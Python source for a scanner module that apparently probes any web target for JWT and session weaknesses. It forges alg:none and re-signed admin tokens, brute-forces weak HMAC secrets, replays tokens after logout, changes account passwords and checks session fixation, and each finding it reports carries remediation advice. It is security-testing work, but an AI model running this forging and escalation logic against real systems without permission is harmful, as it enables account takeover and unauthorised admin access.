"""
PHANTOM AI - Session & Token Abuse Scanner (CAMADA 4)

Tests session-level and token-level abuse vulnerabilities on ANY target:
- JWT replay after logout (CWE-613)
- JWT role escalation via secret cracking + claim tampering (CWE-269)
- Logout bypass verification (CWE-613)
- Token survives password change (CWE-613)
- Enhanced session fixation (CWE-384)
- XSS → Token → Privilege Escalation chain (CWE-79 + CWE-269)

All endpoint discovery is GENERIC — no target-specific hardcoding.
Uses aiohttp directly to bypass SafeAsyncClient POST restrictions.

Author: PHANTOM AI Team
Version: 1.0.0
"""

from __future__ import annotations

import json
import os
import ssl
from typing import Any, Optional
from urllib.parse import urlparse

import aiohttp

from scanning.vuln_scanner import Finding, ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)

# Reuse JWT utilities from existing jwt_scanner
from scanning.modules.jwt_scanner import JWTToken, JWTManipulator, WEAK_SECRETS

# Reuse SharedFindingsStore for XSS chain
from utils.shared_findings_store import SharedFindingsStore, VulnType

# ---------------------------------------------------------------------------
# Generic endpoint lists — work on any website
# ---------------------------------------------------------------------------

GENERIC_WHOAMI_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/rest/user/whoami", "/api/v1/me", "/auth/me", "/userinfo",
    "/api/users/me", "/api/current-user", "/api/v1/user",
    "/api/v1/profile", "/api/v1/account", "/me",
]

GENERIC_LOGOUT_PATHS = [
    "/logout", "/signout", "/api/logout", "/api/auth/logout",
    "/api/v1/auth/logout", "/rest/user/logout", "/auth/logout",
    "/api/signout", "/session/destroy", "/oauth/revoke",
    "/api/v1/logout", "/api/v1/signout",
]

GENERIC_ADMIN_PATHS = [
    "/api/admin", "/admin/api", "/api/users", "/api/v1/users",
    "/rest/admin/application-configuration", "/admin/config",
    "/api/admin/users", "/api/v1/admin/users", "/management/users",
    "/api/v1/admin", "/admin/dashboard", "/api/admin/config",
]

GENERIC_PASSWORD_CHANGE_PATHS = [
    "/api/user/change-password", "/rest/user/change-password",
    "/api/account/password", "/api/v1/auth/password",
    "/api/me/password", "/auth/password", "/api/v1/user/password",
    "/api/password", "/api/change-password",
]

# Login endpoints for session fixation test
GENERIC_LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/v1/login",
    "/login", "/auth/login", "/api/auth/login", "/api/v1/auth/login",
]

# Role claims in JWT payload (generic across frameworks)
ROLE_CLAIM_NAMES = [
    "role", "roles", "admin", "is_admin", "isAdmin",
    "scope", "scopes", "permissions", "groups", "level",
    "user_type", "userType", "type", "access_level", "privilege",
]

# Values to try for privilege escalation per claim
ESCALATION_VALUES: dict[str, list] = {
    "role": ["admin", "administrator", "superadmin", "root", "staff"],
    "roles": [["admin"], ["administrator"]],
    "admin": [True, 1, "true", "yes"],
    "is_admin": [True, 1, "true"],
    "isAdmin": [True, 1, "true"],
    "scope": ["admin", "admin:*", "write:all", "*"],
    "scopes": ["admin", "admin:*", "*"],
    "permissions": [["admin"], ["*"]],
    "groups": [["admin"], ["administrators"]],
    "level": [0, 1, 99, 100, 999],
    "user_type": ["admin", "staff", "superuser"],
    "userType": ["admin", "staff", "superuser"],
    "type": ["admin"],
    "access_level": ["admin", "full", "root"],
    "privilege": ["admin", "root", "superuser"],
}

# Session cookie name patterns
SESSION_COOKIE_NAMES = [
    "connect.sid", "PHPSESSID", "JSESSIONID", "session",
    "_session", "sid", "sessionid", "session_id", "SESSION",
    "ASP.NET_SessionId", "ASPSESSIONID", "laravel_session",
    "ci_session", "flask_session", "_csrf", "token",
]

# Password change body variations (generic)
PASSWORD_CHANGE_BODIES = [
    lambda old, new: {"password": new, "new": new, "current": old},
    lambda old, new: {"old_password": old, "new_password": new},
    lambda old, new: {"currentPassword": old, "newPassword": new},
    lambda old, new: {"current": old, "new": new, "repeat": new},
    lambda old, new: {"oldPassword": old, "newPassword": new, "confirmPassword": new},
]

# SSL context for local/self-signed targets
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


class SessionAbuseScanner(ScanModule):
    """Session & Token Abuse Scanner — works on any target."""

    name = "session_abuse"

    def __init__(self, settings: Any) -> None:
        super().__init__(settings)
        self._discovered: dict[str, tuple[str, int]] = {}  # category -> (path, status)
        self._cracked_secret: Optional[str] = None
        self._role_escalation_proved = False

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """Execute session & token abuse scan."""
        findings: list[dict] = []
        base_url = host if host.startswith("http") else f"https://{host}"

        # Extract auth context
        auth_ctx = asset_data.get("auth_context")
        if not auth_ctx or not getattr(auth_ctx, "has_auth", False):
            logger.warning("[SESSION_ABUSE] No auth_context — skipping")
            return {"vulns": findings, "info": [{"message": "No auth token available"}]}

        token = auth_ctx.token
        auth_headers = auth_ctx.auth_headers

        logger.info(
            f"[SESSION_ABUSE] Starting scan with token from {auth_ctx.method} "
            f"({auth_ctx.email})"
        )

        timeout = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Phase 0: Discover working endpoints
            await self._discover_endpoints(session, base_url, auth_headers, rate_limiter)

            # Test 1: JWT Replay After Logout
            try:
                result = await self._test_jwt_replay_after_logout(
                    session, base_url, token, auth_headers, rate_limiter,
                )
                findings.extend(result)
            except Exception as e:
                logger.debug(f"[SESSION_ABUSE] Replay test error: {e}")

            # Test 2: JWT Role Escalation (crack secret + forge admin token)
            try:
                result = await self._test_role_escalation(
                    session, base_url, token, rate_limiter,
                )
                findings.extend(result)
            except Exception as e:
                logger.debug(f"[SESSION_ABUSE] Role escalation error: {e}")

            # Test 3: Logout Bypass (fresh session verification)
            try:
                result = await self._test_logout_bypass_fresh_session(
                    base_url, token, rate_limiter,
                )
                findings.extend(result)
            except Exception as e:
                logger.debug(f"[SESSION_ABUSE] Logout bypass error: {e}")

            # Test 4: Token Survives Password Change
            try:
                result = await self._test_token_survives_password_change(
                    session, base_url, token, auth_ctx, rate_limiter,
                )
                findings.extend(result)
            except Exception as e:
                logger.debug(f"[SESSION_ABUSE] Password change test error: {e}")

            # Test 5: Enhanced Session Fixation
            try:
                result = await self._test_session_fixation(
                    session, base_url, auth_ctx, rate_limiter,
                )
                findings.extend(result)
            except Exception as e:
                logger.debug(f"[SESSION_ABUSE] Session fixation error: {e}")

            # Test 6: XSS → Token → Privilege Escalation Chain
            try:
                result = await self._test_xss_token_chain(
                    base_url, token, findings,
                )
                findings.extend(result)
            except Exception as e:
                logger.debug(f"[SESSION_ABUSE] XSS chain error: {e}")

        logger.info(f"[SESSION_ABUSE] Scan complete: {len(findings)} findings")
        return {"vulns": findings, "info": []}

    # ------------------------------------------------------------------
    # Phase 0: Generic Endpoint Discovery
    # ------------------------------------------------------------------

    async def _discover_endpoints(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        auth_headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Discover working endpoints on target (generic probing)."""
        # Discover whoami endpoint (authenticated GET that returns user info)
        whoami = await self._probe_first_working(
            session, base_url, GENERIC_WHOAMI_PATHS, "GET", auth_headers, rate_limiter,
        )
        if whoami:
            self._discovered["whoami"] = whoami
            logger.info(f"[SESSION_ABUSE] Whoami endpoint: {whoami[0]} (status {whoami[1]})")

        # Discover admin endpoint — accept 200 (with JSON body) or 401/403
        admin = await self._probe_first_json_or_restricted(
            session, base_url, GENERIC_ADMIN_PATHS, auth_headers, rate_limiter,
        )
        if admin:
            self._discovered["admin"] = admin
            logger.info(f"[SESSION_ABUSE] Admin endpoint: {admin[0]} (status {admin[1]})")

        # Discover logout endpoint
        logout = await self._probe_first_working(
            session, base_url, GENERIC_LOGOUT_PATHS, "POST", auth_headers, rate_limiter,
            accept_statuses={200, 204, 302, 401},
        )
        if logout:
            self._discovered["logout"] = logout
            logger.info(f"[SESSION_ABUSE] Logout endpoint: {logout[0]} (status {logout[1]})")

    async def _probe_first_working(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        paths: list[str],
        method: str,
        headers: dict[str, str],
        rate_limiter: RateLimiter,
        accept_statuses: set[int] | None = None,
    ) -> Optional[tuple[str, int]]:
        """Probe paths, return first that responds with acceptable status."""
        if accept_statuses is None:
            accept_statuses = {200, 201}

        for path in paths:
            url = f"{base_url}{path}"
            await rate_limiter.acquire()
            try:
                if method == "GET":
                    async with session.get(url, headers=headers, ssl=_SSL_CTX) as resp:
                        if resp.status in accept_statuses:
                            return (path, resp.status)
                else:
                    async with session.post(url, headers=headers, ssl=_SSL_CTX) as resp:
                        if resp.status in accept_statuses:
                            return (path, resp.status)
            except Exception:
                continue
        return None

    async def _probe_first_json_or_restricted(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        paths: list[str],
        headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> Optional[tuple[str, int]]:
        """Probe paths for admin endpoints. Accept 401/403 or 200 with JSON body."""
        for path in paths:
            url = f"{base_url}{path}"
            await rate_limiter.acquire()
            try:
                async with session.get(url, headers=headers, ssl=_SSL_CTX) as resp:
                    if resp.status in (401, 403):
                        return (path, resp.status)
                    if resp.status == 200:
                        ct = resp.headers.get("content-type", "")
                        if "json" in ct:
                            return (path, resp.status)
                        # Skip HTML responses (SPA fallback)
            except Exception:
                continue
        return None

    # ------------------------------------------------------------------
    # Test 1: JWT Replay After Logout
    # ------------------------------------------------------------------

    async def _test_jwt_replay_after_logout(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        token: str,
        auth_headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test if JWT token remains valid after calling logout endpoint."""
        findings: list[dict] = []

        whoami = self._discovered.get("whoami")
        if not whoami:
            return findings

        whoami_path, _ = whoami
        whoami_url = f"{base_url}{whoami_path}"

        # Step 1: Verify token works pre-logout
        await rate_limiter.acquire()
        async with session.get(whoami_url, headers=auth_headers, ssl=_SSL_CTX) as resp:
            if resp.status != 200:
                return findings
            try:
                pre_data = await resp.json()
            except Exception:
                pre_data = {}

        # Step 2: Call logout endpoint
        logout = self._discovered.get("logout")
        logout_found = False
        logout_path = None
        if logout:
            logout_path, _ = logout
            await rate_limiter.acquire()
            try:
                async with session.post(
                    f"{base_url}{logout_path}", headers=auth_headers, ssl=_SSL_CTX,
                ) as resp:
                    if resp.status in (200, 204, 302):
                        logout_found = True
            except Exception:
                pass

        # Also try GET on logout paths (some frameworks use GET)
        if not logout_found:
            for path in GENERIC_LOGOUT_PATHS[:4]:
                await rate_limiter.acquire()
                try:
                    async with session.get(
                        f"{base_url}{path}", headers=auth_headers, ssl=_SSL_CTX,
                    ) as resp:
                        if resp.status in (200, 204, 302):
                            logout_found = True
                            logout_path = path
                            break
                except Exception:
                    continue

        # Step 3: Replay token after logout
        await rate_limiter.acquire()
        async with session.get(whoami_url, headers=auth_headers, ssl=_SSL_CTX) as resp:
            if resp.status == 200:
                try:
                    post_data = await resp.json()
                except Exception:
                    post_data = {}

                findings.append(Finding(
                    type="session_abuse",
                    name="JWT Token Valid After Logout",
                    severity="HIGH",
                    description=(
                        "JWT token remains valid after logout. The server does not "
                        "maintain a token denylist or use server-side session state. "
                        "An attacker who obtains a JWT (via XSS, network sniffing, or "
                        "log exposure) can replay it indefinitely until natural expiration."
                    ),
                    host=base_url,
                    matched_at=whoami_url,
                    evidence=[
                        f"Pre-logout: GET {whoami_path} -> 200",
                        f"Logout attempted: {logout_path or 'no endpoint found'} "
                        f"({'success' if logout_found else 'failed/not found'})",
                        f"Post-logout replay: GET {whoami_path} -> 200 (SAME identity)",
                        f"Token: {token[:40]}...",
                    ],
                    cvss_score=7.1,
                    cwe="CWE-613",
                    confidence=90,
                    remediation=(
                        "Implement server-side token denylist (Redis/DB). On logout, "
                        "add the token's JTI to the denylist. Validate against denylist "
                        "on every authenticated request. Use short-lived access tokens "
                        "(5-15 min) with refresh token rotation."
                    ),
                    metadata={
                        "module": "session_abuse",
                        "attack_type": "jwt_replay_after_logout",
                        "logout_endpoint_found": logout_found,
                        "logout_path": logout_path,
                        "whoami_path": whoami_path,
                        "token_prefix": token[:40],
                    },
                ).to_dict())

        # If no logout endpoint found at all, report that too
        if not logout_found and not logout:
            findings.append(Finding(
                type="session_abuse",
                name="No Logout Endpoint Found",
                severity="MEDIUM",
                description=(
                    "No functional logout endpoint was found on the target. "
                    "Without a logout mechanism, JWT tokens cannot be revoked "
                    "and remain valid for their entire lifetime. Users cannot "
                    "effectively terminate their sessions."
                ),
                host=base_url,
                matched_at=base_url,
                evidence=[
                    f"Probed {len(GENERIC_LOGOUT_PATHS)} logout paths — none responded",
                    f"Token type: Bearer JWT",
                ],
                cvss_score=5.4,
                cwe="CWE-613",
                confidence=80,
                remediation=(
                    "Implement a logout endpoint that adds the token to a server-side "
                    "denylist. Use short-lived access tokens with refresh token rotation."
                ),
                metadata={
                    "module": "session_abuse",
                    "attack_type": "missing_logout_endpoint",
                    "paths_probed": GENERIC_LOGOUT_PATHS,
                },
            ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Test 2: JWT Role Escalation (crack secret + forge admin token)
    # ------------------------------------------------------------------

    async def _test_role_escalation(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        token: str,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Crack JWT secret or use alg:none, modify role, prove admin access."""
        findings: list[dict] = []

        # Parse JWT
        parsed = JWTToken.parse(token)
        if not parsed:
            return findings

        alg = parsed.get_algorithm().upper()

        # Find role claims in payload
        role_claims = self._find_role_claims(parsed.payload)
        if not role_claims:
            logger.debug("[SESSION_ABUSE] No role claims found in JWT payload")
            return findings

        # Build list of forging strategies
        # Each strategy: (method_name, forge_fn) where forge_fn(header, payload) -> token
        strategies: list[tuple[str, Any]] = []

        # Strategy 1: alg:none (works on any algorithm if server doesn't validate)
        def forge_none(header: dict, payload: dict) -> str:
            h = header.copy()
            h["alg"] = "none"
            return JWTManipulator.create_token(h, payload, "", "none")

        strategies.append(("alg_none", forge_none))

        # Also try "None", "NONE", "nOnE" variants
        for none_variant in ("None", "NONE", "nOnE"):
            def forge_none_var(header: dict, payload: dict, v=none_variant) -> str:
                h = header.copy()
                h["alg"] = v
                return JWTManipulator.create_token(h, payload, "", "none")
            strategies.append((f"alg_{none_variant}", forge_none_var))

        # Strategy 2: HMAC brute-force (only for HS* algorithms)
        if alg.startswith("HS"):
            cracked = None
            for secret in WEAK_SECRETS:
                if JWTManipulator.verify_hmac_signature(parsed, secret):
                    cracked = secret
                    self._cracked_secret = secret
                    logger.info(f"[SESSION_ABUSE] JWT secret cracked: '{cracked}'")
                    break

            if cracked:
                def forge_hmac(header: dict, payload: dict, s=cracked, a=alg) -> str:
                    return JWTManipulator.create_token(header, payload, s, a)
                strategies.append(("weak_secret", forge_hmac))

        # Strategy 3: Algorithm confusion (RS256 -> HS256 using empty/known key)
        if alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS"):
            # Try signing with empty secret as HS256
            def forge_alg_confusion(header: dict, payload: dict) -> str:
                h = header.copy()
                h["alg"] = "HS256"
                return JWTManipulator.create_token(h, payload, "", "HS256")
            strategies.append(("alg_confusion_empty", forge_alg_confusion))

        # Try each strategy with each role claim
        for strategy_name, forge_fn in strategies:
            if self._role_escalation_proved:
                break

            for claim_path, original_value in role_claims:
                if self._role_escalation_proved:
                    break

                claim_name = claim_path.split(".")[-1]
                escalation_vals = ESCALATION_VALUES.get(claim_name, ["admin"])

                for esc_value in escalation_vals:
                    forged_payload = _deep_set(parsed.payload.copy(), claim_path, esc_value)
                    forged_token = forge_fn(parsed.header, forged_payload)
                    forged_headers = {"Authorization": f"Bearer {forged_token}"}

                    # Test against admin endpoints
                    admin_access = await self._verify_admin_access(
                        session, base_url, forged_headers, rate_limiter,
                    )
                    if admin_access:
                        endpoint, status, data_preview = admin_access
                        self._role_escalation_proved = True

                        # Determine description based on strategy
                        if strategy_name == "weak_secret":
                            method_desc = (
                                f"JWT HMAC secret is weak ('{self._cracked_secret}'). "
                                f"By cracking the secret, modifying the '{claim_path}' "
                                f"claim, and re-signing, an attacker gains admin access."
                            )
                            remediation = (
                                "1. Use a cryptographically random secret (256+ bits). "
                                "2. Migrate to asymmetric signing (RS256/ES256). "
                                "3. Validate roles from database, not JWT claims. "
                            )
                        elif strategy_name.startswith("alg_none") or strategy_name.startswith("alg_N"):
                            method_desc = (
                                f"Server accepts JWT tokens with algorithm 'none' "
                                f"(no signature verification). By setting alg=none and "
                                f"modifying '{claim_path}' from '{original_value}' to "
                                f"'{esc_value}', an attacker gains admin access."
                            )
                            remediation = (
                                "1. Reject tokens with alg=none (whitelist allowed algorithms). "
                                "2. Always verify signatures server-side. "
                                "3. Validate roles from database, not JWT claims. "
                            )
                        else:
                            method_desc = (
                                f"Server is vulnerable to JWT algorithm confusion. "
                                f"By switching from {alg} to HS256 and modifying "
                                f"'{claim_path}', an attacker gains admin access."
                            )
                            remediation = (
                                "1. Explicitly whitelist allowed JWT algorithms. "
                                "2. Use asymmetric keys (RS256) with proper validation. "
                                "3. Validate roles from database, not JWT claims. "
                            )

                        findings.append(Finding(
                            type="session_abuse",
                            name="Privilege Escalation via JWT Tampering",
                            severity="CRITICAL",
                            description=method_desc,
                            host=base_url,
                            matched_at=f"{base_url}{endpoint}",
                            evidence=[
                                f"Original algorithm: {alg}",
                                f"Attack strategy: {strategy_name}",
                                f"Original claim: {claim_path}={original_value}",
                                f"Forged claim: {claim_path}={esc_value}",
                                f"GET {endpoint} -> {status} (privileged data)",
                                f"Forged token: {forged_token[:50]}...",
                            ],
                            cvss_score=9.8,
                            cwe="CWE-269",
                            confidence=95,
                            remediation=remediation,
                            metadata={
                                "module": "session_abuse",
                                "attack_type": f"role_escalation_{strategy_name}",
                                "original_alg": alg,
                                "strategy": strategy_name,
                                "original_claim": {claim_path: str(original_value)},
                                "forged_claim": {claim_path: str(esc_value)},
                                "admin_endpoint": endpoint,
                                "admin_status": status,
                                "data_preview": data_preview[:200] if data_preview else "",
                            },
                        ).to_dict())
                        break  # Found one — stop trying values for this claim

        return findings

    async def _verify_admin_access(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        forged_headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> Optional[tuple[str, int, str]]:
        """Try forged token against admin endpoints. Return (path, status, data) or None."""
        admin = self._discovered.get("admin")
        paths_to_try: list[tuple[str, int]] = []
        if admin:
            paths_to_try.append(admin)

        # Add all generic admin paths (with assumed status 0=unknown)
        for path in GENERIC_ADMIN_PATHS:
            if not any(p[0] == path for p in paths_to_try):
                paths_to_try.append((path, 0))

        # Strategy A: Find an endpoint that's restricted (401/403) without auth
        # but accessible (200) with forged token
        for path, discovered_status in paths_to_try:
            url = f"{base_url}{path}"

            # If discovery found 401/403 for normal user,
            # getting 200 with forged token = clear escalation
            if discovered_status in (401, 403):
                await rate_limiter.acquire()
                try:
                    async with session.get(url, headers=forged_headers, ssl=_SSL_CTX) as resp:
                        if resp.status == 200:
                            ct = resp.headers.get("content-type", "")
                            body = await resp.text()
                            if "json" in ct and self._is_real_data(body, path):
                                return (path, resp.status, body[:500])
                except Exception:
                    continue
                continue

            # For unknown paths, check without auth first
            if discovered_status == 0:
                await rate_limiter.acquire()
                try:
                    async with session.get(url, ssl=_SSL_CTX) as resp_noauth:
                        noauth_status = resp_noauth.status
                    if noauth_status in (401, 403):
                        await rate_limiter.acquire()
                        async with session.get(url, headers=forged_headers, ssl=_SSL_CTX) as resp:
                            if resp.status == 200:
                                ct = resp.headers.get("content-type", "")
                                body = await resp.text()
                                if "json" in ct and self._is_real_data(body, path):
                                    return (path, resp.status, body[:500])
                except Exception:
                    continue

        # Strategy B: Use whoami endpoint to verify forged token is accepted
        # If server accepts the forged token at all, that's proof of tampering
        whoami = self._discovered.get("whoami")
        if whoami:
            whoami_path, _ = whoami
            await rate_limiter.acquire()
            try:
                async with session.get(
                    f"{base_url}{whoami_path}", headers=forged_headers, ssl=_SSL_CTX,
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        return (whoami_path, resp.status, body[:500])
            except Exception:
                pass

        return None

    def _is_real_data(self, body: str, path: str) -> bool:
        """Check if response is real API data (not SPA HTML fallback)."""
        body_stripped = body.strip()
        # JSON responses are real data
        if body_stripped.startswith(("{", "[")):
            return True
        # If path looks like API but response is HTML, it's a SPA fallback
        api_prefixes = ("/api/", "/rest/", "/v1/", "/v2/", "/admin/api")
        if any(path.startswith(p) for p in api_prefixes) and "<html" in body.lower():
            return False
        return False

    # ------------------------------------------------------------------
    # Test 3: Logout Bypass (fresh session)
    # ------------------------------------------------------------------

    async def _test_logout_bypass_fresh_session(
        self,
        base_url: str,
        token: str,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Verify logout doesn't invalidate token using completely fresh sessions."""
        findings: list[dict] = []
        whoami = self._discovered.get("whoami")
        logout = self._discovered.get("logout")

        if not whoami or not logout:
            return findings

        whoami_path, _ = whoami
        logout_path, _ = logout
        auth_headers = {"Authorization": f"Bearer {token}"}
        timeout = aiohttp.ClientTimeout(total=10)

        # Step 1: Fresh session — call logout
        async with aiohttp.ClientSession(timeout=timeout) as fresh1:
            await rate_limiter.acquire()
            try:
                async with fresh1.post(
                    f"{base_url}{logout_path}", headers=auth_headers, ssl=_SSL_CTX,
                ) as resp:
                    logout_status = resp.status
            except Exception:
                return findings

        # Step 2: Completely new session — replay token
        async with aiohttp.ClientSession(timeout=timeout) as fresh2:
            await rate_limiter.acquire()
            async with fresh2.get(
                f"{base_url}{whoami_path}", headers=auth_headers, ssl=_SSL_CTX,
            ) as resp:
                if resp.status == 200:
                    findings.append(Finding(
                        type="session_abuse",
                        name="Logout Does Not Invalidate JWT Token",
                        severity="HIGH",
                        description=(
                            "After calling the logout endpoint, the JWT token remains "
                            "valid when used from a completely new HTTP session (no "
                            "shared cookies). This proves the server does not maintain "
                            "a token denylist. An attacker with a stolen token can use "
                            "it indefinitely regardless of user logout."
                        ),
                        host=base_url,
                        matched_at=f"{base_url}{whoami_path}",
                        evidence=[
                            f"Logout: POST {logout_path} -> {logout_status}",
                            f"Replay (fresh session): GET {whoami_path} -> 200",
                            "Token NOT invalidated server-side",
                        ],
                        cvss_score=6.5,
                        cwe="CWE-613",
                        confidence=85,
                        remediation=(
                            "Implement server-side token denylist. On logout, blacklist "
                            "the token's JTI claim. Check denylist on every request."
                        ),
                        metadata={
                            "module": "session_abuse",
                            "attack_type": "logout_bypass_fresh_session",
                            "logout_path": logout_path,
                            "logout_status": logout_status,
                            "whoami_path": whoami_path,
                        },
                    ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Test 4: Token Survives Password Change
    # ------------------------------------------------------------------

    async def _test_token_survives_password_change(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        token: str,
        auth_ctx: Any,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test if old JWT still works after password change."""
        findings: list[dict] = []
        whoami = self._discovered.get("whoami")
        if not whoami:
            return findings

        whoami_path, _ = whoami
        auth_headers = {"Authorization": f"Bearer {token}"}

        # We need a password to change from
        # Use a known password from auth_ctx.extra or try generic
        old_password = auth_ctx.extra.get("password", "")
        if not old_password:
            return findings  # Can't test without knowing current password

        new_password = "Ph@nt0m_Changed_1!Aa"

        # Try each password change endpoint with each body format
        pw_changed = False
        pw_change_path = None
        for path in GENERIC_PASSWORD_CHANGE_PATHS:
            url = f"{base_url}{path}"
            for body_fn in PASSWORD_CHANGE_BODIES:
                body = body_fn(old_password, new_password)
                await rate_limiter.acquire()
                try:
                    async with session.post(
                        url, json=body, headers=auth_headers, ssl=_SSL_CTX,
                    ) as resp:
                        if resp.status == 200:
                            pw_changed = True
                            pw_change_path = path
                            break
                except Exception:
                    continue
            if pw_changed:
                break

        if not pw_changed:
            return findings  # No password change endpoint found

        # Replay old token after password change
        await rate_limiter.acquire()
        async with session.get(
            f"{base_url}{whoami_path}", headers=auth_headers, ssl=_SSL_CTX,
        ) as resp:
            if resp.status == 200:
                findings.append(Finding(
                    type="session_abuse",
                    name="JWT Token Valid After Password Change",
                    severity="HIGH",
                    description=(
                        "JWT token remains valid after password change. An attacker "
                        "who has stolen a token can continue using it even after the "
                        "victim changes their password. All previous tokens should be "
                        "invalidated upon password change."
                    ),
                    host=base_url,
                    matched_at=f"{base_url}{whoami_path}",
                    evidence=[
                        f"Password changed: POST {pw_change_path} -> 200",
                        f"Old token replay: GET {whoami_path} -> 200 (still valid)",
                    ],
                    cvss_score=7.1,
                    cwe="CWE-613",
                    confidence=85,
                    remediation=(
                        "Invalidate all existing tokens when password changes. "
                        "Use a per-user token version counter or JTI denylist. "
                        "Force re-authentication after password change."
                    ),
                    metadata={
                        "module": "session_abuse",
                        "attack_type": "token_survives_password_change",
                        "pw_change_path": pw_change_path,
                    },
                ).to_dict())

        # Restore original password if possible (cleanup)
        for body_fn in PASSWORD_CHANGE_BODIES:
            body = body_fn(new_password, old_password)
            try:
                async with session.post(
                    f"{base_url}{pw_change_path}",
                    json=body, headers=auth_headers, ssl=_SSL_CTX,
                ) as resp:
                    if resp.status == 200:
                        break
            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # Test 5: Enhanced Session Fixation
    # ------------------------------------------------------------------

    async def _test_session_fixation(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        auth_ctx: Any,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test if session cookies rotate after authentication."""
        findings: list[dict] = []

        # Step 1: Get initial session cookies
        await rate_limiter.acquire()
        pre_cookies: dict[str, str] = {}
        try:
            async with session.get(f"{base_url}/", ssl=_SSL_CTX) as resp:
                for cookie_name in SESSION_COOKIE_NAMES:
                    for cookie in resp.cookies.values():
                        if cookie.key.lower() == cookie_name.lower():
                            pre_cookies[cookie.key] = cookie.value
                    # Also check Set-Cookie headers
                    for header_val in resp.headers.getall("Set-Cookie", []):
                        for name in SESSION_COOKIE_NAMES:
                            if header_val.lower().startswith(name.lower() + "="):
                                val = header_val.split("=", 1)[1].split(";")[0]
                                pre_cookies[name] = val
        except Exception:
            return findings

        if not pre_cookies:
            return findings  # No session cookies found

        # Step 2: Login (trigger authentication state change)
        login_path = None
        for path in GENERIC_LOGIN_PATHS:
            url = f"{base_url}{path}"
            bodies = [
                {"email": auth_ctx.email, "password": auth_ctx.extra.get("password", "test")},
                {"username": auth_ctx.email, "password": auth_ctx.extra.get("password", "test")},
            ]
            for body in bodies:
                await rate_limiter.acquire()
                try:
                    async with session.post(url, json=body, ssl=_SSL_CTX) as resp:
                        if resp.status == 200:
                            login_path = path
                            # Step 3: Check if session cookies changed
                            for cookie_name, pre_value in pre_cookies.items():
                                for cookie in resp.cookies.values():
                                    if cookie.key.lower() == cookie_name.lower():
                                        if cookie.value == pre_value:
                                            findings.append(Finding(
                                                type="session_abuse",
                                                name="Session Fixation — Cookie Not Rotated After Login",
                                                severity="HIGH",
                                                description=(
                                                    f"Session cookie '{cookie_name}' retains the "
                                                    f"same value before and after authentication. "
                                                    f"An attacker can set a known session ID in the "
                                                    f"victim's browser and hijack their session after "
                                                    f"they authenticate."
                                                ),
                                                host=base_url,
                                                matched_at=f"{base_url}{path}",
                                                evidence=[
                                                    f"Cookie: {cookie_name}",
                                                    f"Pre-login value: {pre_value[:40]}...",
                                                    f"Post-login value: {cookie.value[:40]}... (SAME)",
                                                    f"Login endpoint: POST {path}",
                                                ],
                                                cvss_score=7.5,
                                                cwe="CWE-384",
                                                confidence=85,
                                                remediation=(
                                                    "Regenerate session ID after successful authentication. "
                                                    "Call req.session.regenerate() (Express), "
                                                    "session_regenerate_id() (PHP), or equivalent."
                                                ),
                                                metadata={
                                                    "module": "session_abuse",
                                                    "attack_type": "session_fixation",
                                                    "cookie_name": cookie_name,
                                                    "login_path": path,
                                                },
                                            ).to_dict())
                            break
                except Exception:
                    continue
            if login_path:
                break

        return findings

    # ------------------------------------------------------------------
    # Test 6: XSS → Token → Privilege Escalation Chain
    # ------------------------------------------------------------------

    async def _test_xss_token_chain(
        self,
        base_url: str,
        token: str,
        existing_findings: list[dict],
    ) -> list[dict]:
        """Compose findings from XSS + token abuse into attack chain."""
        findings: list[dict] = []

        # Query SharedFindingsStore for XSS findings
        store = SharedFindingsStore.get_instance()
        xss_findings = store.get_findings_by_type(VulnType.XSS)

        if not xss_findings:
            return findings

        xss_url = xss_findings[0].endpoint or "unknown"

        # Check if we proved role escalation (from Test 2)
        if self._role_escalation_proved:
            findings.append(Finding(
                type="session_abuse",
                name="XSS to Admin Privilege Escalation Chain",
                severity="CRITICAL",
                description=(
                    f"Complete attack chain: "
                    f"1) XSS at {xss_url} allows JavaScript execution. "
                    f"2) JWT token accessible via localStorage/sessionStorage "
                    f"(not protected by HttpOnly — it's a Bearer token). "
                    f"3) Stolen JWT can be decoded, role modified, and re-signed "
                    f"with the cracked weak secret. "
                    f"4) Forged admin JWT grants administrative access. "
                    f"Impact: Any user visiting a malicious link leads to full "
                    f"admin compromise."
                ),
                host=base_url,
                matched_at=xss_url,
                evidence=[
                    f"XSS confirmed at: {xss_url}",
                    "Token storage: Bearer JWT (accessible via JavaScript)",
                    f"Secret cracked: '{self._cracked_secret}'",
                    "Role escalation: verified (admin endpoint accessed)",
                    "Chain: XSS → Token Theft → Decode → Tamper Role → Admin",
                ],
                cvss_score=9.8,
                cwe="CWE-79",
                confidence=85,
                remediation=(
                    "1. Fix XSS vulnerabilities (input sanitization, CSP). "
                    "2. Store tokens in HttpOnly cookies instead of localStorage. "
                    "3. Use strong JWT signing secrets (256+ bit random). "
                    "4. Validate roles from database, not JWT claims. "
                    "5. Deploy Content-Security-Policy headers."
                ),
                metadata={
                    "module": "session_abuse",
